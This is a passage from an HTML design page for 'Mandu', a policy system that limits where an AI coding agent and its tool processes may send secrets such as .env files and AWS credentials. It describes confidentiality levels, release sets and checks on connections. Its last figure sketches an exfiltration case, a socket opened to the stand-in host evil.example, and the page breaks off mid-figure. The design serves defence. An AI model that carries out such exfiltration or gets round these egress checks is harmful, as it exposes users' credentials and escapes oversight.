@@ -1,0 +1,939 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Mandu Policy Lattice</title>
+<style>
+/* Layout: one reading column (~760px) of numbered figures; wide figures scroll inside their own frame. */
+:root{
+  --bg:#f5f6f8; --surface:#ffffff; --sunk:#eceef2; --fg:#1b2030; --muted:#5a6275; --line:#d5d9e1;
+  --accent:#2f5bd3;
+  --l-public:#4f7d63; --l-any:#a8760a; --l-local:#bf5a1f; --l-no:#a02238;
+  --l-public-bg:#e3eee7; --l-any-bg:#f6ecd2; --l-local-bg:#f7e2d4; --l-no-bg:#f5dde2;
+  --ok:#2f7a4c; --ask:#9a6a00; --deny:#a02238;
+  --term-bg:#1c2130; --term-fg:#dfe3ec; --term-dim:#8790a5; --term-line:#353c4f; --term-accent:#8fb0ff; --term-ok:#86d6a2; --term-warn:#f0c46a;
+  --f-display:"IBM Plex Sans Condensed","Arial Narrow",system-ui,sans-serif;
+  --f-body:"IBM Plex Sans",system-ui,-apple-system,"Segoe UI",sans-serif;
+  --f-mono:"IBM Plex Mono",ui-monospace,"SFMono-Regular",Menlo,monospace;
+}
+@media (prefers-color-scheme: dark){:root:not([data-theme="light"]){
+  --bg:#12151c; --surface:#1a1e27; --sunk:#232834; --fg:#e4e7ee; --muted:#9aa2b4; --line:#323949;
+  --accent:#7d9cf5;
+  --l-public:#7fbf98; --l-any:#e2b54a; --l-local:#f0935c; --l-no:#f2788d;
+  --l-public-bg:#1d2f25; --l-any-bg:#33290f; --l-local-bg:#38220f; --l-no-bg:#3a1820;
+  --ok:#7fcf9c; --ask:#e9bd55; --deny:#f2788d; color-scheme:dark}}
+:root[data-theme="dark"]{
+  --bg:#12151c; --surface:#1a1e27; --sunk:#232834; --fg:#e4e7ee; --muted:#9aa2b4; --line:#323949;
+  --accent:#7d9cf5;
+  --l-public:#7fbf98; --l-any:#e2b54a; --l-local:#f0935c; --l-no:#f2788d;
+  --l-public-bg:#1d2f25; --l-any-bg:#33290f; --l-local-bg:#38220f; --l-no-bg:#3a1820;
+  --ok:#7fcf9c; --ask:#e9bd55; --deny:#f2788d; color-scheme:dark}
+
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font:15px/1.6 var(--f-body);padding:0 16px}
+.wrap{max-width:780px;margin:0 auto;padding-block:40px 80px;display:flex;flex-direction:column;gap:56px}
+h1,h2,h3{font-family:var(--f-display);text-wrap:balance;margin:0;line-height:1.15}
+h1{font-size:2.3rem;font-weight:700;letter-spacing:-.01em}
+h2{font-size:1.55rem;font-weight:600}
+h3{font-size:1.1rem;font-weight:600}
+p{margin:0;max-width:66ch}
+code,.mono{font-family:var(--f-mono);font-size:.88em}
+code{background:var(--sunk);padding:.08em .35em;border-radius:3px}
+a{color:var(--accent)}
+.eyebrow{font:500 .74rem/1 var(--f-mono);letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+header{display:flex;flex-direction:column;gap:14px}
+header .lede{font-size:1.06rem;color:var(--muted)}
+.where{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:10px}
+.where div{border:1px solid var(--line);background:var(--surface);border-radius:6px;padding:12px 14px;min-width:0;display:flex;flex-direction:column;gap:4px}
+.where b{font-family:var(--f-mono);font-size:.8rem;font-weight:500;word-break:break-all}
+.where span{color:var(--muted);font-size:.86rem}
+section{display:flex;flex-direction:column;gap:16px}
+.part{border-top:2px solid var(--fg);padding-top:14px;display:flex;flex-direction:column;gap:6px}
+figure{margin:0;display:flex;flex-direction:column;gap:10px}
+.frame{background:var(--surface);border:1px solid var(--line);border-radius:8px;padding:18px;overflow-x:auto}
+figcaption{font-size:.88rem;color:var(--muted);max-width:66ch}
+figcaption b{color:var(--fg);font-family:var(--f-display);font-weight:600;margin-right:.35em}
+svg text{font-family:var(--f-body)}
+svg .mono{font-family:var(--f-mono)}
+.formula{font-family:var(--f-mono);font-size:.84rem;background:var(--sunk);border-radius:6px;padding:12px 14px;white-space:pre;overflow-x:auto;line-height:1.55}
+
+/* level chips */
+.lv{display:inline-block;font:500 .78rem/1.5 var(--f-mono);padding:0 .45em;border-radius:3px;white-space:nowrap}
+.lv.p{color:var(--l-public);background:var(--l-public-bg)}
+.lv.a{color:var(--l-any);background:var(--l-any-bg)}
+.lv.l{color:var(--l-local);background:var(--l-local-bg)}
+.lv.n{color:var(--l-no);background:var(--l-no-bg)}
+
+/* matrix */
+table.mx{border-collapse:separate;border-spacing:3px;width:100%;min-width:640px;font-size:.82rem}
+table.mx th{font:600 .78rem/1.25 var(--f-display);text-align:left;color:var(--muted);padding:4px 6px;vertical-align:bottom}
+table.mx th.row{vertical-align:middle}
+table.mx td{padding:7px 8px;border-radius:4px;vertical-align:top;line-height:1.35}
+td.raw{background:var(--l-public-bg);color:var(--fg)}
+td.cond{background:var(--l-any-bg)}
+td.ask{background:var(--sunk);outline:1px dashed var(--ask);outline-offset:-1px}
+td.deny{background:var(--l-no-bg)}
+td i{font-style:normal;font:600 .7rem/1 var(--f-mono);letter-spacing:.05em;text-transform:uppercase;display:block;margin-bottom:3px}
+td.raw i{color:var(--ok)} td.cond i{color:var(--l-any)} td.ask i{color:var(--ask)} td.deny i{color:var(--deny)}
+
+/* chips for sinks */
+.sinks{display:flex;flex-wrap:wrap;gap:6px}
+.sink{font:500 .78rem/1.6 var(--f-mono);border:1px solid var(--line);border-radius:999px;padding:0 .65em;background:var(--surface)}
+.sink.dim{opacity:.38;text-decoration:line-through}
+.sink.keep{border-color:var(--ok);color:var(--ok)}
+
+.join{display:grid;grid-template-columns:1fr auto 1fr auto 1fr;gap:12px;align-items:center}
+.join .col{display:flex;flex-direction:column;gap:8px;min-width:0}
+.join .op{font:600 1.4rem/1 var(--f-mono);color:var(--muted);text-align:center}
+.join .col h4{margin:0;font:500 .8rem/1.3 var(--f-mono)}
+@media (max-width:620px){.join{grid-template-columns:1fr}.join .op{text-align:left}}
+
+.three{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+@media (max-width:640px){.three{grid-template-columns:1fr}}
+.rel{border:1px solid var(--line);border-radius:6px;padding:14px;display:flex;flex-direction:column;gap:8px;background:var(--bg);min-width:0}
+.rel h4{margin:0;font:600 1.05rem/1.2 var(--f-display)}
+.rel .sig{font:500 .76rem/1.4 var(--f-mono);color:var(--muted)}
+.rel p{font-size:.86rem}
+.rel .tag{align-self:flex-start;font:600 .68rem/1 var(--f-mono);letter-spacing:.06em;text-transform:uppercase;padding:4px 6px;border-radius:3px;background:var(--sunk);color:var(--muted)}
+.rel .tag.go{color:var(--accent)}
+
+/* ladder lists */
+ol.ladder{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:6px;counter-reset:s}
+ol.ladder li{counter-increment:s;display:grid;grid-template-columns:2rem 1fr;gap:10px;align-items:start;padding:10px 12px;border:1px solid var(--line);border-radius:6px;background:var(--bg)}
+ol.ladder li::before{content:counter(s);font:600 1.1rem/1.3 var(--f-display);color:var(--accent)}
+ol.ladder li div{min-width:0;font-size:.9rem}
+ol.ladder li b{font-family:var(--f-display);font-weight:600}
+
+.split{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media (max-width:600px){.split{grid-template-columns:1fr}}
+.split > div{border-radius:6px;padding:14px;display:flex;flex-direction:column;gap:8px;min-width:0}
+.split .t{background:var(--l-public-bg)} .split .r{background:var(--l-no-bg)}
+.split h4{margin:0;font:600 1.05rem/1.2 var(--f-display)}
+.split ul{margin:0;padding-left:1.1em;font-size:.88rem;display:flex;flex-direction:column;gap:3px}
+
+/* yaml */
+pre.yaml{margin:0;font:400 .8rem/1.6 var(--f-mono);background:var(--sunk);border-radius:6px;padding:14px;overflow-x:auto}
+.yk{color:var(--accent)} .yc{color:var(--muted)}
+
+/* explorer */
+.ex{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);gap:18px}
+@media (max-width:640px){.ex{grid-template-columns:1fr}}
+.ex fieldset{border:0;margin:0;padding:0;display:flex;flex-direction:column;gap:6px;min-width:0}
+.ex legend{font:500 .74rem/1 var(--f-mono);letter-spacing:.08em;text-transform:uppercase;color:var(--muted);margin-bottom:8px}
+.ex label{display:flex;gap:8px;align-items:flex-start;font-size:.86rem;padding:6px 8px;border-radius:5px;border:1px solid var(--line);background:var(--bg);cursor:pointer}
+.ex label:hover{border-color:var(--accent)}
+.ex input{margin-top:3px;accent-color:var(--accent)}
+.ex input:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.ex label small{display:block;color:var(--muted);font-family:var(--f-mono);font-size:.74rem}
+.verdict{grid-column:1/-1;border-radius:6px;padding:14px 16px;display:flex;flex-direction:column;gap:6px;border:1px solid var(--line)}
+.verdict .v{font:700 1.15rem/1.2 var(--f-display)}
+.verdict.raw{background:var(--l-public-bg)} .verdict.raw .v{color:var(--ok)}
+.verdict.ask{background:var(--l-any-bg)} .verdict.ask .v{color:var(--ask)}
+.verdict.deny{background:var(--l-no-bg)} .verdict.deny .v{color:var(--deny)}
+.verdict.cond{background:var(--l-any-bg)} .verdict.cond .v{color:var(--l-any)}
+.verdict p{font-size:.88rem}
+.verdict .lbl{font:500 .78rem/1.5 var(--f-mono);color:var(--muted);word-break:break-word}
+.note{font-size:.84rem;color:var(--muted)}
+/* recent-updates box */
+.news{border:1px solid var(--line);border-radius:8px;background:var(--surface);padding:16px 18px;display:flex;flex-direction:column;gap:10px}
+.news ul{margin:0;padding-left:1.1em;display:flex;flex-direction:column;gap:6px;font-size:.9rem}
+.news .when{font:500 .74rem/1 var(--f-mono);color:var(--muted)}
+
+/* effort ladder */
+.effort{display:grid;grid-template-columns:repeat(5,minmax(0,1fr));gap:8px;align-items:end;min-width:640px}
+.effort .st{border:1px solid var(--line);border-radius:6px;background:var(--bg);padding:10px;display:flex;flex-direction:column;gap:6px;font-size:.82rem}
+.effort .st b{font:600 1rem/1.15 var(--f-display)}
+.effort .st .who{font:500 .7rem/1.2 var(--f-mono);text-transform:uppercase;letter-spacing:.06em}
+.effort .st .who.t{color:var(--ok)} .effort .st .who.r{color:var(--deny)}
+.effort .st code{font-size:.74rem;word-break:break-word}
+.effort .bar{height:6px;border-radius:3px;background:var(--accent);opacity:.85}
+
+/* idea cards */
+.ideas{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+@media (max-width:620px){.ideas{grid-template-columns:1fr}}
+.idea{border:1px solid var(--line);border-radius:6px;padding:12px 14px;display:flex;flex-direction:column;gap:6px;background:var(--surface);min-width:0}
+.idea h4{margin:0;font:600 1rem/1.25 var(--f-display)}
+.idea p{font-size:.86rem}
+.idea .st{align-self:flex-start;font:600 .66rem/1 var(--f-mono);letter-spacing:.06em;text-transform:uppercase;padding:4px 6px;border-radius:3px}
+.idea .st.built{background:var(--l-public-bg);color:var(--ok)}
+.idea .st.half{background:var(--l-any-bg);color:var(--ask)}
+.idea .st.new{background:var(--sunk);color:var(--accent)}
+
+/* terminal */
+.term{background:var(--term-bg);color:var(--term-fg);border-radius:8px;font:400 .78rem/1.55 var(--f-mono);overflow-x:auto}
+.term .tbar{display:flex;gap:6px;padding:8px 12px;border-bottom:1px solid var(--term-line)}
+.term .tbar i{width:9px;height:9px;border-radius:50%;background:var(--term-line)}
+.term pre{margin:0;padding:12px 14px;white-space:pre;font:inherit}
+.term .pr{color:var(--term-accent)} .term .dm{color:var(--term-dim)} .term .ok{color:var(--term-ok)} .term .wa{color:var(--term-warn)}
+
+/* dashboard mock */
+.dash{border:1px solid var(--line);border-radius:8px;background:var(--bg);overflow:hidden}
+.dash .top{display:flex;flex-wrap:wrap;align-items:center;gap:14px;padding:10px 14px;background:var(--surface);border-bottom:1px solid var(--line);font-size:.84rem}
+.dash .brand{font:700 1rem/1 var(--f-display)}
+.dash .nav{display:flex;gap:12px}
+.dash .nav span{color:var(--muted)} .dash .nav span.on{color:var(--fg);font-weight:600;border-bottom:2px solid var(--accent)}
+.dash .badge{font:600 .7rem/1 var(--f-mono);background:var(--deny);color:var(--surface);border-radius:999px;padding:2px 6px;margin-left:3px}
+.dash .stat{margin-left:auto;color:var(--ok);font-size:.8rem}
+.dash .body{padding:14px;display:flex;flex-direction:column;gap:12px}
+.dash h5{margin:0;font:600 1.05rem/1.2 var(--f-display)}
+.tabs{display:flex;gap:6px;flex-wrap:wrap}
+.tabs span{font-size:.78rem;border:1px solid var(--line);border-radius:999px;padding:2px 10px;background:var(--surface)}
+.tabs span.on{border-color:var(--accent);color:var(--accent);font-weight:600}
+.ftab{overflow-x:auto}
+.ftab table{border-collapse:collapse;width:100%;min-width:640px;font-size:.8rem}
+.ftab th{font:600 .72rem/1.2 var(--f-display);color:var(--muted);text-align:center;padding:6px 4px;border-bottom:1px solid var(--line)}
+.ftab th:first-child,.ftab th:last-child{text-align:left}
+.ftab td{padding:7px 4px;border-bottom:1px solid var(--line);text-align:center;vertical-align:middle}
+.ftab td:first-child{text-align:left}
+.ftab td:last-child{text-align:left}
+.ftab .nm{font-family:var(--f-mono);font-size:.78rem}
+.ftab .src{display:block;color:var(--muted);font-size:.72rem}
+.dot{display:inline-block;width:12px;height:12px;border-radius:50%;border:2px solid var(--line)}
+.dot.s{background:var(--accent);border-color:var(--accent)}
+.dot.r{border-color:var(--accent)}
+.ftab .edit{color:var(--accent);font-size:.74rem;margin-left:6px}
+.pending{border:1px dashed var(--accent);border-radius:6px;padding:10px 12px;display:flex;flex-wrap:wrap;gap:10px;align-items:center;font-size:.82rem;background:var(--surface)}
+.pending .msg{flex:1 1 260px;min-width:0}
+.btn{font:600 .76rem/1 var(--f-body);border:1px solid var(--line);border-radius:5px;padding:6px 10px;background:var(--surface);color:var(--fg);white-space:nowrap}
+.btn.p{background:var(--accent);border-color:var(--accent);color:var(--surface)}
+.btn.d{color:var(--deny)}
+.card{border:1px solid var(--line);border-radius:6px;background:var(--surface);padding:12px 14px;display:flex;flex-direction:column;gap:8px;font-size:.84rem}
+.card .h{font-weight:600}
+.card .row{display:flex;flex-wrap:wrap;gap:6px}
+.card .meta{color:var(--muted);font-size:.78rem}
+.describe{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+.describe .in{flex:1 1 260px;border:1px solid var(--line);border-radius:5px;padding:7px 10px;background:var(--surface);font-size:.82rem;color:var(--muted);min-width:0}
+.form{display:grid;grid-template-columns:auto 1fr;gap:6px 12px;font-size:.8rem;align-items:center}
+.form .k{color:var(--muted)}
+.form .v{border:1px solid var(--line);border-radius:4px;padding:4px 8px;background:var(--surface);font-family:var(--f-mono);font-size:.76rem;min-width:0;overflow-wrap:anywhere}
+
+/* use cases */
+.uc{display:flex;flex-direction:column;gap:12px;border-top:1px solid var(--line);padding-top:18px}
+.uc .goal{font-size:.95rem;max-width:66ch}
+.uc .who{font:500 .74rem/1 var(--f-mono);letter-spacing:.08em;text-transform:uppercase;color:var(--accent)}
+.steps2{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);gap:12px}
+@media (max-width:680px){.steps2{grid-template-columns:1fr}}
+.steps2 > div{display:flex;flex-direction:column;gap:8px;min-width:0}
+.steps2 h4{margin:0;font:500 .74rem/1 var(--f-mono);letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.steps2 ol{margin:0;padding-left:1.2em;font-size:.86rem;display:flex;flex-direction:column;gap:4px}
+.result{font-size:.86rem;border-left:3px solid var(--ok);padding:4px 0 4px 12px;max-width:66ch}
+.mock-note{font:500 .7rem/1 var(--f-mono);color:var(--muted);letter-spacing:.06em;text-transform:uppercase}
+
+footer{font-size:.84rem;color:var(--muted);display:flex;flex-direction:column;gap:6px;border-top:1px solid var(--line);padding-top:16px}
+@media (prefers-reduced-motion:no-preference){.verdict{transition:background-color .15s}}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header>
+  <span class="eyebrow">Mandu design · confidentiality axis</span>
+  <h1>The policy lattice and its rules</h1>
+  <p class="lede">How Mandu decides where a secret's bytes may go: four levels in a total order for models, per-datum release sets for everything else, intersection when data combine, and a short list of precedence rules that turn <code>policy.yaml</code> into verdicts.</p>
+  <div class="where">
+    <div><b>docs/design/confidentiality/confidentiality.md</b><span>§2 the 2×4 label, §3 level semantics, §4 the session watermark, §6 classification and path precedence</span></div>
+    <div><b>docs/design/confidentiality/confidentiality-plan-13-reader-set-labels.md</b><span>§4 the policy model (Release, Openers, Trust; holders; one check), §5 how a user writes it</span></div>
+    <div><b>docs/design/ui/policy-surface.md</b><span>§2.4 dispositions and egress precedence, §2.5 rules minted from asks, §8.3 the monotonic split</span></div>
+    <div><b>docs/usage.md</b><span>the user guide: the <code>policy.yaml</code> format, the Rules page, <code>mandu why</code> and <code>mandu policy suggest</code></span></div>
+  </div>
+</header>
+
+<aside class="news" aria-label="Recent updates">
+  <span class="eyebrow">Reflected here · master as of 2026-10-04</span>
+  <ul>
+    <li><b>An allow-list of readers.</b> A listed program gets the real bytes only if it is vetted (<code>ssh</code>, <code>ssh-add</code>) or its entry says <code>prints: nothing</code>, which is your word. Any other listed program gets the placeholder copy. <span class="when">0a77984d · plan 13 D8 (12)</span></li>
+    <li><b><code>psql</code> and <code>pg_restore</code> are printers</b>, like <code>git</code>. They never get the real file, even with <code>prints: nothing</code>. <code>pg_dump</code> is not vetted, so it needs <code>prints: nothing</code>. <span class="when">8b97f530, 29ad9a39</span></li>
+    <li><b>A shell read honours your label.</b> A relative path in a Codex shell command is resolved in the call's working directory, so a <code>public</code> label wins there just as it does for <code>Read</code>. <span class="when">705ccc6c, ed2ba262</span></li>
+    <li><b>Refusals explain themselves.</b> A refused connection, an exec-gate block or a fully denied call puts the reason into the tool result the model reads, so the agent can tell you why. <span class="when">4bf750c3, 12bf4bae, a814b40d</span></li>
+  </ul>
+</aside>
+
+<!-- ============ PART 1: LATTICE ============ -->
+<section>
+  <div class="part"><span class="eyebrow">Part 1</span><h2>The lattice</h2></div>
+  <p>Every protected datum carries one composed label: an integrity half (trusted / untrusted, now frozen) and a confidentiality half with four levels. The confidentiality levels form a <b>total order</b>, because each level's restriction set strictly contains the one below it.</p>
+
+  <figure>
+    <div class="frame">
+      <svg viewBox="0 0 700 340" width="100%" style="min-width:560px;display:block" role="img" aria-label="Four levels stacked from public at the bottom to no-model at the top, each with its restriction set">
+        <defs>
+          <marker id="ah" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0L10 5L0 10z" style="fill:var(--muted)"/></marker>
+        </defs>
+        <!-- spine -->
+        <line x1="120" y1="300" x2="120" y2="52" style="stroke:var(--muted);stroke-width:1.5" marker-end="url(#ah)"/>
+        <text x="96" y="180" transform="rotate(-90 96 180)" text-anchor="middle" style="fill:var(--muted);font-size:12px">⊑  more secret</text>
+
+        <!-- nodes: y = 285, 205, 125, 45 -->
+        <g>
+          <rect x="140" y="266" width="170" height="40" rx="5" style="fill:var(--l-public-bg);stroke:var(--l-public)"/>
+          <text x="225" y="291" text-anchor="middle" class="mono" style="fill:var(--l-public);font-size:15px;font-weight:500">public</text>
+          <text x="330" y="284" style="fill:var(--fg);font-size:13px">restricts  { }</text>
+          <text x="330" y="300" style="fill:var(--muted);font-size:12px">integrity axis alone governs</text>
+        </g>
+        <g>
+          <rect x="140" y="186" width="170" height="40" rx="5" style="fill:var(--l-any-bg);stroke:var(--l-any)"/>
+          <text x="225" y="211" text-anchor="middle" class="mono" style="fill:var(--l-any);font-size:15px;font-weight:500">any-model</text>
+          <text x="330" y="204" style="fill:var(--fg);font-size:13px">restricts  { outside }</text>
+          <text x="330" y="220" style="fill:var(--muted);font-size:12px">any model may read it (logged); the world may not</text>
+        </g>
+        <g>
+          <rect x="140" y="106" width="170" height="40" rx="5" style="fill:var(--l-local-bg);stroke:var(--l-local)"/>
+          <text x="225" y="131" text-anchor="middle" class="mono" style="fill:var(--l-local);font-size:15px;font-weight:500">local-model</text>
+          <text x="330" y="124" style="fill:var(--fg);font-size:13px">restricts  { outside, external models }</text>
+          <text x="330" y="140" style="fill:var(--muted);font-size:12px">only a declared  local: true  model may read it</text>
+        </g>
+        <g>
+          <rect x="140" y="26" width="170" height="40" rx="5" style="fill:var(--l-no-bg);stroke:var(--l-no)"/>
+          <text x="225" y="51" text-anchor="middle" class="mono" style="fill:var(--l-no);font-size:15px;font-weight:500">no-model</text>
+          <text x="330" y="44" style="fill:var(--fg);font-size:13px">restricts  { outside, every model }</text>
+          <text x="330" y="60" style="fill:var(--muted);font-size:12px">credentials; the catalog's default</text>
+        </g>
+        <!-- edges between nodes -->
+        <line x1="225" y1="266" x2="225" y2="226" style="stroke:var(--line);stroke-width:2"/>
+        <line x1="225" y1="186" x2="225" y2="146" style="stroke:var(--line);stroke-width:2"/>
+        <line x1="225" y1="106" x2="225" y2="66" style="stroke:var(--line);stroke-width:2"/>
+
+        <!-- fail-closed callout -->
+        <path d="M 640 290 C 690 200, 690 110, 640 50" style="fill:none;stroke:var(--l-no);stroke-width:1.5;stroke-dasharray:4 4" marker-end="url(#ah)"/>
+        <text x="634" y="320" text-anchor="end" style="fill:var(--l-no);font-size:12px;font-weight:600">fail-closed lands at the top</text>
+        <text x="20" y="20" style="fill:var(--muted);font-size:11px" class="mono">L1 ⊑ L2  ⟺  restrict(L1) ⊆ restrict(L2)</text>
+      </svg>
+    </div>
+    <figcaption><b>Figure 1.</b> The confidentiality axis, <code>public ⊑ any-model ⊑ local-model ⊑ no-model</code>. Arbiter unreachable, an uncertain classification, an unknown stored value or a catalog match all mean <span class="lv n">no-model</span>. Nothing defaults to <span class="lv a">any-model</span> or <span class="lv l">local-model</span>; the catalog mints only <span class="lv p">public</span> and <span class="lv n">no-model</span>. With no <code>local: true</code> endpoint declared, <span class="lv l">local-model</span> behaves exactly as <span class="lv n">no-model</span>.</figcaption>
+  </figure>
+
+  <figure>
+    <div class="frame">
+      <table class="mx">
+        <thead><tr>
+          <th></th><th>Human (reply)</th><th>Local file write</th><th>Declared local model</th><th>External model (vendor)</th><th>Bound destination</th><th>Any other host</th>
+        </tr></thead>
+        <tbody>
+          <tr><th class="row"><span class="lv p">public</span></th>
+            <td class="raw"><i>raw</i></td><td class="raw"><i>raw</i></td><td class="raw"><i>raw</i></td><td class="raw"><i>raw</i></td><td class="raw"><i>raw</i></td><td class="raw"><i>raw</i></td></tr>
+          <tr><th class="row"><span class="lv a">any-model</span></th>
+            <td class="raw"><i>raw</i>reply filter shows originals</td>
+            <td class="raw"><i>labelled</i>copy refers to its sources</td>
+            <td class="cond"><i>read on ask</i>quarantined or in-context</td>
+            <td class="cond"><i>symbol first</i>quarantined read, or a logged in-context read that raises the watermark</td>
+            <td class="raw"><i>released</i></td>
+            <td class="ask"><i>ask</i>Inbox: once / session / always</td></tr>
+          <tr><th class="row"><span class="lv l">local-model</span></th>
+            <td class="raw"><i>raw</i></td>
+            <td class="raw"><i>labelled</i></td>
+            <td class="cond"><i>read on ask</i>helper or local main model only</td>
+            <td class="deny"><i>hard deny</i>symbol only; no approval changes it</td>
+            <td class="raw"><i>released</i></td>
+            <td class="ask"><i>ask</i></td></tr>
+          <tr><th class="row"><span class="lv n">no-model</span></th>
+            <td class="raw"><i>raw</i></td>
+            <td class="raw"><i>labelled</i></td>
+            <td class="deny"><i>hard deny</i></td>
+            <td class="deny"><i>hard deny</i></td>
+            <td class="raw"><i>released</i>desymbolized at the last hop</td>
+            <td class="ask"><i>ask</i></td></tr>
+        </tbody>
+      </table>
+    </div>
+    <figcaption><b>Figure 2.</b> What each level admits, by sink. The levels differ only in the <em>model</em> columns. Past them, the three secret levels behave as one: release only at the datum's bindings, otherwise ask. A <b>hard deny</b> is a level question; only changing the level moves it. An <b>ask</b> is a binding question; a human can answer it.</figcaption>
+  </figure>
+
+  <h3>Where the order stops: destinations are sets</h3>
+  <p>A total order of four points cannot say anything about hosts or programs. Plan 13 makes the label set-valued: each datum has a <b>release set</b> of sinks, ordered by reverse inclusion (fewer sinks means more secret). On the model sinks alone that set is exactly the level, so the levels stay a total order there.</p>
+  <div class="formula">Release(d) = Models(level(d)) ∪ Bindings(d) ∪ {human, local storage}
+
+Models(public)      = every sink
+Models(any-model)   = every declared model (main model, helper)
+Models(local-model) = the declared local: true models
+Models(no-model)    = ∅
+
+L1 ⊑ L2  ⟺  Release(L1) ⊇ Release(L2)
+Release(d1 ⊔ d2) = Release(d1) ∩ Release(d2)        ← join is intersection</div>
+
+  <figure>
+    <div class="frame">
+      <div class="join">
+        <div class="col">
+          <h4>Release(<span style="color:var(--l-no)">.env</span>)</h4>
+          <div class="sinks"><span class="sink keep">human</span><span class="sink keep">storage</span><span class="sink">api.stripe.com</span></div>
+        </div>
+        <div class="op">∩</div>
+        <div class="col">
+          <h4>Release(<span style="color:var(--l-no)">~/.aws/credentials</span>)</h4>
+          <div class="sinks"><span class="sink keep">human</span><span class="sink keep">storage</span><span class="sink">*.amazonaws.com</span></div>
+        </div>
+        <div class="op">=</div>
+        <div class="col">
+          <h4>Label(process that read both)</h4>
+          <div class="sinks"><span class="sink keep">human</span><span class="sink keep">storage</span><span class="sink dim">api.stripe.com</span><span class="sink dim">*.amazonaws.com</span></div>
+        </div>
+      </div>
+    </div>
+    <figcaption><b>Figure 3.</b> The join. A process holding both keys may send neither one to either host; any send now asks. This was defect <b>D1</b>: the old code took the <em>union</em> of bindings, so the AWS key could go to Stripe. The fix (<code>intersectBindings</code> in <code>arbiter/policy/flow-taint.ts</code>) applies to process holders and to the session holder alike. This is FIDES's confidentiality lattice with Mandu's sinks as the principals.</figcaption>
+  </figure>
+
+  <h3>Three relations per datum</h3>
+  <figure>
+    <div class="frame">
+      <div class="three">
+        <div class="rel">
+          <span class="tag go">travels with data</span>
+          <h4>Release</h4>
+          <span class="sig">Release(d) ⊆ Sinks</span>
+          <p>Where the raw bytes may go: the level's models, the bindings, the human, local storage. This is the label proper, and the only relation that a copy or a holder inherits.</p>
+          <span class="sig">policy.yaml: level, bindings</span>
+        </div>
+        <div class="rel">
+          <span class="tag">read gate only</span>
+          <h4>Openers</h4>
+          <span class="sig">Openers(d) ⊆ Programs</span>
+          <p>Which programs may open the file raw, pinned by path and hash. A listed program gets the real bytes only if it is <b>vetted</b> (<code>ssh</code>, <code>ssh-add</code>) or its entry says <code>prints: nothing</code>; any other listed program gets the twin. A non-listed program gets <code>EACCES</code>, or the twin under <code>others: twin</code>. Shells, interpreters and printers (<code>git</code>, <code>psql</code>, <code>cat</code>) admit nothing.</p>
+          <span class="sig">policy.yaml: readers, prints, others</span>
+        </div>
+        <div class="rel">
+          <span class="tag">model sink only</span>
+          <h4>Trust</h4>
+          <span class="sig">Trust(d, p) ∈ {secret, mask, clear}</span>
+          <p>How much of opener <code>p</code>'s output still carries <code>d</code> when the model sees it. <code>clear</code> says "deploy prints its status, not this file". It never widens a destination or a write, and a registered value that leaks verbatim is still masked.</p>
+          <span class="sig">policy.yaml: readers[].output</span>
+        </div>
+      </div>
+    </div>
+    <figcaption><b>Figure 4.</b> Programs are not sinks. Once bytes are inside a tool call's process tree, the OS cannot tell which program holds them (<code>python3 … | tee</code>). So programs are checked where they can be, at the open, and the label that travels names only sinks.</figcaption>
+  </figure>
+
+  <h3>Holders shrink as they read</h3>
+  <p>A <b>holder</b> is whoever holds raw bytes: the agent's session, one tool call's process tree, or a long-lived process. It starts with every sink, and each raw read intersects its label down. A flow needs a source event (raw read) and a sink event (connect, request, write-open, model call), in either order; the check runs at whichever comes later.</p>
+  <figure>
+    <div class="frame">
+      <svg viewBox="0 0 720 300" width="100%" style="min-width:600px;display:block" role="img" aria-label="Timeline of a holder's label shrinking with two reads, then a connect being checked">
+        <line x1="40" y1="70" x2="690" y2="70" style="stroke:var(--line);stroke-width:2"/>
+        <text x="40" y="24" class="mono" style="fill:var(--muted);font-size:11px">LANE A · sink after source</text>
+        <!-- events -->
+        <circle cx="70" cy="70" r="7" style="fill:var(--surface);stroke:var(--muted);stroke-width:2"/>
+        <text x="70" y="50" text-anchor="middle" style="fill:var(--fg);font-size:12px">start</text>
+        <text x="70" y="96" text-anchor="middle" class="mono" style="fill:var(--muted);font-size:11px">all sinks</text>
+
+        <circle cx="240" cy="70" r="7" style="fill:var(--l-no)"/>
+        <text x="240" y="50" text-anchor="middle" style="fill:var(--fg);font-size:12px">opens .env raw</text>
+        <text x="240" y="96" text-anchor="middle" class="mono" style="fill:var(--muted);font-size:11px">{human, storage,</text>
+        <text x="240" y="110" text-anchor="middle" class="mono" style="fill:var(--muted);font-size:11px">api.stripe.com}</text>
+
+        <circle cx="430" cy="70" r="7" style="fill:var(--l-no)"/>
+        <text x="430" y="50" text-anchor="middle" style="fill:var(--fg);font-size:12px">opens aws creds raw</text>
+        <text x="430" y="96" text-anchor="middle" class="mono" style="fill:var(--muted);font-size:11px">{human, storage}</text>
+
+        <rect x="570" y="58" width="24" height="24" rx="3" style="fill:var(--surface);stroke:var(--deny);stroke-width:2"/>
+        <text x="582" y="50" text-anchor="middle" style="fill:var(--fg);font-size:12px">connect api.stripe.com</text>
+        <text x="582" y="100" text-anchor="middle" style="fill:var(--deny);font-size:12px;font-weight:600">not in Label(h) → ask</text>
+
+        <!-- lane B -->
+        <line x1="40" y1="210" x2="690" y2="210" style="stroke:var(--line);stroke-width:2"/>
+        <text x="40" y="164" class="mono" style="fill:var(--muted);font-size:11px">LANE B · source after sink</text>
+        <rect x="128" y="198" width="24" height="24" rx="3" style="fill:var(--surface);stroke:var(--muted);stroke-width:2"/>
+        <text x="140" y="190" text-anchor="middle" style="fill:var(--fg);font-size:12px">socket open to evil.example</text>
+        <rect x="318" y="198" width="24" height="24" rx="3" style="fill:var(--surface);stroke:var(--muted);stroke-width:2"/>
